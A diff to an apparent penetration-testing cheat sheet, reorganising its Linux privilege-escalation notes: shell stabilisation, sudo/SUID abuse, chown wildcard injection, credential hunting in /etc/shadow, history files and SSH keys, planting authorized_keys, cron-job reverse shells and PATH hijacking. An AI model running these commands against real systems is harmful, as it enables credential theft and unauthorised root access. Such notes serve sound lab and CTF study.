@@ -3088,14 +3088,8 @@ script -qc /bin/bash /dev/null
 # In reverse shell
 $ python3 -c 'import pty; pty.spawn("/bin/bash")'	#usually good enough
 
-# In Kali
-$ stty raw -echo
-
-# In reverse shell
-$ reset
-$ export SHELL=bash
-$ export TERM=xterm-256color
-$ stty rows [] columns []
+# Follow-Up
+$ CTRL+Z -> stty raw -echo; fg -> reset -> export TERM=scr
 ```
 
 #### Bash / Netcat payloads
@@ -4191,18 +4185,45 @@ Forward a local service to a remote port. Usually used to gain shells or exchang
 
 ### Users & Privileges
 
-- Users `cat /etc/passwd | grep sh` and `ls  /home`
-- User Group:
+#### Enumeration
 
-  -  `id` and what can that group do
-  -  [interesting_groups](https://hacktricks.boitatech.com.br/linux-unix/privilege-escalation/interesting-groups-linux-pe)
+Users:
 
-- Search on [gtfobins](https://gtfobins.github.io) bin files with relative privileges
+- `cat /etc/passwd | grep sh`
+- `cat /etc/hosts`
+- Last logins: `lastlog`
+- Active Users: `w`
 
-##### SUDO
+Environment:
+
+- `env`
+
+- `echo $PATH`
+
+  - Writable `$PATH` variable:
+
+    ```bash
+    PATH=.:${PATH}		# Adds current DIR to PATH
+    export PATH
+    ```
+
+#### Groups
+
+`id` &rarr; [interesting_groups](https://hacktricks.boitatech.com.br/linux-unix/privilege-escalation/interesting-groups-linux-pe)
+
+- **video:**
+
+- **staff**: can read/write `/usr/local/bin` and `/usr/local/sbin` 
+
+  &rarr; check root processes 
+
+- **lxd/lxc:** to root is possible
+
+#### SUDO
 
 ```bash
 sudo -l		 # List sudo privileges
+sudo -V		 # Check sudo version
 
 sudo su 	 # Switch to the root user 
 su [USER] 	 # Switch to a local user
@@ -4215,8 +4236,6 @@ sudo -u [USER] [COMMAND] 	# Execute an application as an user
 
   The `*` character gets expanded to all the matching files.
 
-  
-
   Examples:
 
   - `chown` and `chmod`
@@ -4228,20 +4247,20 @@ sudo -u [USER] [COMMAND] 	# Execute an application as an user
     - `chown [USER] [FILE] --reference=[REF FILE]`
 
       Sets the owner of the specified `[FILE]` to match the owner of the `[REF FILE]`, `[USER]` is ignored.
-  
+
     ```bash
     # Create a file reference owned by us
     touch reference
     # Create a file called as the flag of chown
     touch -- --reference=reference
     ```
-
+  
     If you create a symlink to **/etc/passwd** in the same directory, then the owner of /etc/passwd will also be you.
     
     
-
-  Avoid checks:
   
+  Avoid checks:
+
   - If there is a check to control if the link is linking to a priviledged folder, you can do a double link:
   
     ```bash
@@ -4249,10 +4268,19 @@ sudo -u [USER] [COMMAND] 	# Execute an application as an user
     ln -s [FILE HOP] [FILE]			# Creates a link to FILE HOP
     ```
 
-##### SUID
+#### SUID
 
 - `find / -perm -u=s -type f 2>/dev/null`
+
 - Non-Default / [SUID3ENUM](https://github.com/Anon-Exploiter/SUID3NUM) Tool / GTFOBin
+
+- Compare binaries with GTFO bins:
+
+  ```bash
+  for i in $(curl -s https://gtfobins.github.io/ | html2text | cut -d" " -f1 | sed '/^[[:space:]]*$/d');do if grep -q "$i" installed_pkgs.list;then echo "Check GTFO for: $i";fi;done
+  ```
+
+- `strace [BIN] -c1 [IP]`: track and analyze system calls and signal processing
 
 Default SUID (not interesting):
 
@@ -4277,50 +4305,45 @@ Default SUID (not interesting):
 
 ### Credential Hunting
 
-- Everytime you impersonate a user -> Re-Do Relevant Credential Hunting
+Directories & Files Worth Checking:
 
-- Directories & Files Worth Checking
+- Local Hashes
+  - `/etc/shadow`
 
-  - Local Hashes
-    - `/etc/shadow`
+  - `/etc/security/opasswd`
+  
+- User Data
+  - User Owned / Readable Files
+  
+    ```bash
+    find / -type f -user [group] 2>/dev/null | grep -v -E "proc|sys|run|var/lib|usr/src"
+    ```
+  
+    ```bash
+    find / -type f -readable 2>/dev/null | grep -v -E "proc|sys|run|var/lib|usr/src"
+    ```
+  
+  - User Data Directories
+  
+    - `/home` 
+    - Hidden history files:
+  
+      ```bash
+      find / -type f \( -name *_hist -o -name *_history \) -exec ls -l {} \; 2>/dev/null
+      ```
+    - Relevant folders:
+  
+      ```bash
+      ls -la /var/mail /var/backups /var/spool /mnt /var/tmp
+      ```
+  
+- Service Config Files
 
-    - `/etc/security/opasswd`
-  - User Data
-    - User Owned / Readable Files
-      - Exclude -> `/proc`, `/sys`, `/run`, `/var/lib`, `/usr/src`
-    - User Data Directories
-      - `/home` -> History & RC Files / Hidden Content
-      - ``/var/mail`, `/var/backups`, `/var/spool`, `/mnt`, `/var/tmp`
-  - Service Config Files
-    - `netstat -tulnap | grep "LISTEN\|ESTABILISHED"`
-    - Sensitive Configuration Files / Interaction Disclosing Data
-    - SSH
-      - `ls -laR /home | grep ssh`
-      - `grep -Rnw -li / -e "BEGIN OPENSSH PRIVATE KEY" 2>/dev/null`
-    - Databases
-      - MySQL / PSQL / MSSQL / MongoDB / Oracle
-      - Local DB Access
-      - Log Files
-      - User Privileges -> MySQL UDF Escalation (If Root Inside MySQL)
-    - HTTP
-      - Nginx / Apache Configs
-        - Logs
-          - `ls -la /var/log/[nginx/apache2]`
-          - `access.log / error.log`
-        - Virtual Hosts
-          - Nginx -> `/etc/nginx/[nginx.conf/sites-*]`
-          - Apache -> `/etc/apache2/*.conf`, eg `000-default.conf`
-          - Also try `/usr/local/etc/` instead of `/etc`
-      - Web Root Access
-        - `/var/www/[HOSTNAME/html]`, `/srv/[http/html]`, `/opt`
-        - Strings -> `grep -Rnw -li . -e "[STRING]" 2>/dev/null`
-        - Backend Files -> `.php`, `.jsp`, ..., Information in the Code
-        - Database Files -> `.sqlite3`, `.sql`, `.db`, Others
-        - Settings Files -> `.conf`, `.ini`, Others
-  - Application Config Files
-    - Folders -> `/opt`, `/`, Non-Default
-    - Running Process -> `ps aux` -> Enumerate Application Folders
-    - Packages -> `dpkg -l` / `rpm -qa` -> DebSecan Tool / Privesc Tools
+  ```bash
+  find / ! -path "*/proc/*" -iname "*conf*" -type f 2>/dev/null
+  ```
+
+#### Searching techniques
 
 - Search credentials in folder and subfolders:
 
@@ -4349,67 +4372,104 @@ Default SUID (not interesting):
 
 - Shadow Hashes `/etc/shadow` 
 
-### Files
+### Local Network Services
 
-- Readable / Owned web files (for web application)
+```bash
+netstat -tulnap | grep "LISTEN\|ENSTABILISHED"
+```
 
-  - `find / -type f -group [group] 2>/dev/null`  
+- `LISTEN`&rarr; Pivot
+- `ENSTABLISHED`&rarr;Connect to / config files
 
-  - `find / -type f -user [user] 2>/dev/null`
+#### Databases
 
-  - `find / -type f -readable 2>/dev/null`
+- MySQL
+  - Wordpress: `cat wp-config.php | grep 'DB_USER\|DB_PASSWORD'`
+-  PSQL 
+- MSSQL 
+- MongoDB 
+- Oracle
 
-  - Add`| grep -v -E "proc|sys|run"`
+#### HTTP
 
-- Cronjobs:
+- Nginx / Apache Configs
+  - Logs
+    - `ls -la /var/log/[nginx/apache2]`
+    - `access.log / error.log`
+  - Virtual Hosts
+    - Nginx -> `/etc/nginx/[nginx.conf/sites-*]`
+    - Apache -> `/etc/apache2/*.conf`, eg `000-default.conf`
+    - Also try `/usr/local/etc/` instead of `/etc`
+- Web Root Access
+  - `/var/www/[HOSTNAME/html]`, `/srv/[http/html]`, `/opt`
+  - Strings -> `grep -Rnw -li . -e "[STRING]" 2>/dev/null`
+  - Backend Files -> `.php`, `.jsp`, ..., Information in the Code
+  - Database Files -> `.sqlite3`, `.sql`, `.db`, Others
+  - Settings Files -> `.conf`, `.ini`, Others
 
-  **Add new scheduled task:** If we can write to a directory called by a cron job, we can write a bash script with a reverse shell command, which should send us a reverse  shell when executed by the root.
+#### SSH
 
-  - `/etc/crontab`
-  - `/var/spool/anacrontab`
-  - `/etc/cron.d`
-  - `/var/spool/cron/crontabs`
+- Check if there is a private key: `ls -laR /home | grep ssh`
 
-- SSH keys:  
+  - `id_rsa`
+  - `id_ed25519`
 
-  - Check if there is a private key: `/home/user/.ssh/authorized_keys`
-    - `id_rsa`
-    - `id_ed25519`
-  
-  - Read: copy it from `/home/user/.ssh/id_rsa` or `/root/.ssh/id_rsa`
-  
+- Read: copy it from `/home/user/.ssh/id_rsa` or `/root/.ssh/id_rsa`
 
 
   ```bash
-  $ chmod 600 id_rsa	# More restrictive permission
-  $ ssh root@10.10.10.10 -i id_rsa
-  $ nano id_rsa	# open and copy on your machine
+  chmod 600 id_rsa	# More restrictive permission
+  ssh root@10.10.10.10 -i id_rsa
+  nano id_rsa	# open and copy on your machine
   ```
 
   - Write: place our public key in the user's ssh directory at `/home/user/.ssh/authorized_keys`
 
 
-  ```bash
-  ssh-keygen -f key	#Generate a key in the output file key
-  ssh-copy-id -i key.pub root@10.10.10.10	#copy key.pub in and add it to the remote folder
-  ssh user@10.10.10.10 -i key	# Login
-  ```
-
-### Local Network Services
-
-- `netstat -puntal | grep LISTEN` 
-- `ss -puntal | grep LISTEN` 
+    ```bash
+    ssh-keygen -f key	#Generate a key in the output file key
+    ssh-copy-id -i key.pub root@10.10.10.10	#copy key.pub in and add it to the remote folder
+    ssh user@10.10.10.10 -i key	# Login
+    ```
 
 ### Local Processes
 
-- `ps -aux | grep [USER, ROOT...]`
+- Running processes: `ps -aux | grep [USER, ROOT...]`
+- Spy recurrent processes:`./pspy -i 1000`
+  - Try to trigger them (e.g. new ssh login)
+
+
+Config Files:
+
 - Look for local databases / chrome debuggers / password managers
+- Folders -> `/opt`, `/`
+
+#### Reccurent processes
+
+##### Cronjobs
+
+**Add new scheduled task:** If we can write to a directory called by a cron job, we can write a bash script with a reverse shell command, which should send us a reverse  shell when executed by the root.
+
+- `/etc/crontab`
+- `/var/spool/anacrontab`
+- `/etc/cron.d`
+- `/var/spool/cron/crontabs`
+
+##### Exploit
+
+- PATH Hijacking
 
 ### OS 
 
 - Kernel Exploits: `uname -a` 
 
-- Vulnerable Software: `dpkg -l`  (Nagios / CUPS / Screen 4.5.0 / Non-Default)
+- Packages -> `dpkg -l` / `rpm -qa` -> DebSecan Tool / Privesc Tools
+
+- Installed packages:
+
+  ```bash
+  apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list
+  ```
 
 ### Docker Breakout
 
